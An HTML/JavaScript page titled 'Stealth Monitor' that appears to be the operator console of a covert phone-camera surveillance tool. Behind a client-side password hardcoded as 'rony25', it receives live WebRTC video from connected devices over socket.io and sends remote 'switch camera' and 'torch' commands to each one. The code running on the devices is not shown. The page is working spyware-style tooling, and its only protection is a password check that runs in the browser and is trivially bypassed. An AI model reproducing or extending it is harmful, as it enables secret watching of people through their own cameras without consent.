<!DOCTYPE html>
<html>
<head>
    <title>Stealth Monitor</title>
    <style>
        body{background:#111;color:white;font-family:sans-serif;text-align:center;margin:0;}
        #box{display:flex;flex-wrap:wrap;justify-content:center;padding:20px;gap:20px;}
        .card{background:#222;padding:10px;border-radius:10px;border:1px solid #444;width:350px;}
        video{width:100%;background:#000;border-radius:5px;}
        button{padding:10px;margin:5px;cursor:pointer;border:none;border-radius:5px;background:#f85606;color:white;font-weight:bold;}
        #login{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:flex;align-items:center;justify-content:center;z-index:99;}
    </style>
</head>
<body>
    <div id="login"><div><h2>ğŸ”’ Secure Access</h2><input type="password" id="ps" placeholder="rony25" style="padding:10px;"><br><br><button onclick="if(document.getElementById('ps').value=='rony25'){document.getElementById('login').style.display='none';init();}">Login</button></div></div>
    <h2>ğŸ›°ï¸ Global Monitor</h2>
    <div id="box"></div>
    <script src="/socket.io/socket.io.js"></script>
    <script>
        let socket, peers = {};
        function init() {
            socket = io();
            socket.on("offer", async (d) => {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                peers[d.id] = pc;
                const card = document.createElement("div"); card.className="card"; card.id="c-"+d.id;
                card.innerHTML = `<video id="v-${d.id}" autoplay playsinline controls></video><br>
                    <button onclick="socket.emit('switch','${d.id}')">ğŸ”„ Switch</button>
                    <button onclick="socket.emit('torch','${d.id}')">ğŸ’¡ Light</button>`;
                document.getElementById("box").appendChild(card);
                pc.ontrack = e => document.getElementById("v-"+d.id).srcObject = e.streams[0];
                await pc.setRemoteDescription(new RTCSessionDescription(d.offer));
                const a = await pc.createAnswer();
                await pc.setLocalDescription(a);
                socket.emit("answer", { answer: a, id: d.id });
                pc.onicecandidate = e => e.candidate && socket.emit("ice", { candidate: e.candidate, id: d.id });
            });
            socket.on("ice", d => peers[d.id] && peers[d.id].addIceCandidate(new RTCIceCandidate(d.candidate)));
            socket.on("user-left", id => { document.getElementById("c-"+id)?.remove(); delete peers[id]; });
        }
    </script>
</body>
</html>

